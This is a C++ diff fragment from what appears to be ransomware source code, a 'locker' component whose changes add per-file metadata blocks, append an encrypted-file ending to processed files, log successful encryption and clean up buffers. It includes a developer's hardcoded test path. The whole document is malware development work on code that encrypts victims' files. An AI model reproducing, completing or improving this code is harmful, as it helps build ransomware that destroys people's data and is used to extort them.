@@ -502,6 +502,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 	
+	memcpy(FileInfo->recent_filename, "C:\\Users\\Clown\\Desktop\\test\\tt\\as1.laced.txt", memory::StrLen(FileInfo->recent_filename));
 	if(GLOBAL_STATE.g_write_in)
 	{
 		FileInfo->recent_filehandle = FileInfo->filehandle;
@@ -513,12 +514,21 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 
+	if ((FileInfo->hblock = filesystem::init_meta_hblock(FileInfo->filehandle, &FileInfo->filesize, FileInfo->crypt_info->name)) == NULL)
+	{
+		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
+		return false;
+	}
+
+
 	LOG_INFO("process file; %s -> %s", FileInfo->filename, &FileInfo->recent_filename[memory::StrLen(data->Path) + 1]);
 	return true;
 }
 
 void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
+	filesystem::delete_hblock(FileInfo->filehandle, &FileInfo->filesize);
+	filesystem::add_ecrypt_namend(FileInfo->recent_filehandle);
 	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->filehandle);
 	if (FileInfo->recent_filehandle != INVALID_HANDLE_VALUE)
@@ -540,15 +550,13 @@ void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 		LOG_SUCCESS("success encrypt file; %s", data->Filename);
 	else
 		LOG_ERROR("failed encrypt file; %s", data->Filename);
-	memory::memzero_explicit(data->Path, memory::StrLen(data->Path));
-	memory::memzero_explicit(data->Exst, memory::StrLen(data->Exst));
-    memory::memzero_explicit(data->Filename, memory::StrLen(data->Filename));
-    memory::memzero_explicit(data->FullPath, memory::StrLen(data->FullPath));
-    memory::m_free(data->Path);
-	memory::m_free(data->Exst);
-    memory::m_free(data->Filename);
-    memory::m_free(data->FullPath);
-    memory::m_free(data->Path);
+
+	//memory::memzero_free(FileInfo->hblock->pblock, 256);
+	memory::memzero_free(FileInfo->hblock->ctx, sizeof(laced_ctx));
+	memory::memzero_free(data->Path, memory::StrLen(data->Path));
+	memory::memzero_free(data->Exst, memory::StrLen(data->Exst));
+	memory::memzero_free(data->Filename, memory::StrLen(data->Filename));
+	memory::memzero_free(data->FullPath, memory::StrLen(data->FullPath));
 }
 
 bool locker::HandlerCrypt
